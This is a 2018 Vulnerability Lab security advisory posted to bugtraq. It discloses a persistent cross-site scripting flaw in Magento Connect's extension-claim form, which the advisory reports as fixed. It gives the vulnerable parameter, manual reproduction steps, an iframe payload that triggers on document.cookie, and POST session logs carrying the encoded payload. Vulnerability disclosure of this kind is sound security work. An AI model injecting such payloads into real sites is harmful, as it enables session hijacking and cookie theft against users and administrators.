
Date: Fri, 12 Jan 2018 11:54:46 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Magento Connect T1 - (Claim) Persistent Vulnerability

Document Title:
===============
Magento Connect T1 - (Claim) Persistent Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1469


Release Date:
=============
2018-01-08


Vulnerability Laboratory ID (VL-ID):
====================================
1469


Common Vulnerability Scoring System:
====================================
3.8


Vulnerability Class:
====================
Cross Site Scripting - Persistent


Current Estimated Price:
========================
1.000€ - 2.000€


Product & Service Introduction:
===============================
Magento is an open source e-commerce web application that was launched on March 31, 2008 under the name Bento. It was developed 
by Varien (now Magento, a division of eBay) with help from the programmers within the open source community but is now owned 
solely by eBay Inc. Magento was built using parts of the Zend Framework. It uses the entity-attribute-value (EAV) database model 
to store data. In November 2013, W3Techs estimated that Magento was used by 0.9% of all websites.

Our team of security professionals works hard to keep Magento customer information secure. What`s equally important to protecting 
this data? Our security researchers and user community. If you find a site that isn`t following our policies, or a vulnerability 
inside our system, please tell us right away.

( Copy of the Vendor Homepage: http://magento.com/security  &  http://magento.com/security )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered an application-side cross site scripting web vulnerabilityin the Magento Connect web-application.


Vulnerability Disclosure Timeline:
==================================
2018-01-08: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Ebay Inc.
Product: Magento - Connect Web Application 2015 Q2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A persistent cross site scripting web vulnerability has been discovered in the official Magento Connect web-application.
The vulnerability allows remote attackers to inject own script code on the application-side of the affected application module.

The vulnerability is located in the `claim%5Bclaimed_extension_url` value of the `magento-connect/claim/claim/new/` module.
Remote attackers are able to inject own script code on the application-side of the service to compromise user/moderator/admin 
session data. The request method to inject is POST and the attack vector is located on the application-side of the affected module.

The security risk of the web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.8.
Exploitation of the persistent input validation web vulnerability requires a low privileged web-application user account and low 
or medium user interaction. Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, 
persistent external redirects to malicious source and persistent manipulation of affected or connected application modules (api).

Request Method(s):
[+] POST

Vulnerable Service(s):
[+] Magento Connect
						
Vulnerable Module(s):
[+] magento-connect/claim/claim/new/
						
Vulnerable Parameter(s):
[+] claim%5Bclaimed_extension_url


Proof of Concept (PoC):
=======================
The issue in the exception handling can be exploited by remote attackers with privileged application user account and low or medium user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.


Manual steps to reproduce the vulnerability ...
1. Surf to http://www.magentocommerce.com/magento-connect/claim/claim/new/  
2. In the enter a link to the extension on Connect you have to inject the payload via http session tamper
Note: Payload "><iframe src="javascript:alert(document.cookie)"></iframe>
3. Successful reproduce of the persistent xss security vulnerability!


POC: Exception Handling
<div class="m_input_box w85p error"><!-- add class 'error' to show error message-->
<label for="link" class="required">Enter a link to the extension on Connect you believe violates our terms. </label>
<input id="link" name="claim[claimed_extension_url]" value="" type="text"><iframe src="javascript:alert(document.cookie)"></iframe>[MALICIOUS PAYLOAD EXECUTION POINT!]">
<span class="error_txt">Required field. Example: http://www.magentocommerce.com/magento-connect/extension-name</span>
</div>


--- PoC Session Logs [POST] ---
POST http://www.magentocommerce.com/magento-connect/claim/claim/new/ 
Content Size[71413] 
Mime Type[text/html]
   Request Headers:
      Host[www.magentocommerce.com]
      User-Agent[Mozilla/5.0 (X11; Linux i686; rv:37.0) Gecko/20100101 Firefox/37.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[en-US,en;q=0.5]
      Accept-Encoding[gzip, deflate]
      Referer[http://www.magentocommerce.com/magento-connect/claim/claim/new/]
      Cookie
      X-Forwarded-For[8.8.8.8]
      Connection[keep-alive]
   Post Data:
      claim%5Bclaimed_extension_url%5D[%22%3E%3Ciframe+src%3D%22javascript%3Aalert%28document.cookie%29%22%3E%3C%2Fiframe%3E]
      claim%5Boriginal_extension_url%5D[]
      claim%5Bdescription%5D[]
      claim%5Bdigital_signature%5D[]
   Response Headers:
      Server[nginx]
      Content-Type[text/html; charset=UTF-8]
      Connection[keep-alive]
      P3P[CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"]
      Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
      Set-Cookie[frontend=4edl2ftb4c6qoe11lieojciaj7; path=/magento-connect/; domain=www.magentocommerce.com]
      Content-Length[71413]


Solution - Fix & Patch:
=======================
The security vulnerability is marked as fixed within 2017 Q1 - 2017 Q4 by the magento developer team.


Security Risk:
==============
The security rsik of the persistent input validation web vulnerability is estimated as medium (CVSS 3.8).


Credits & Authors:
==================
Vulnerability-Lab [research@...nerability-lab.com] - https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
phone numbers, conversations or anything else to journalists, investigative authorities or private individuals. 

Domains:    www.vulnerability-lab.com		- www.vulnerability-db.com					- www.evolution-sec.com
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get an ask permission.

				    Copyright © 2018 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com

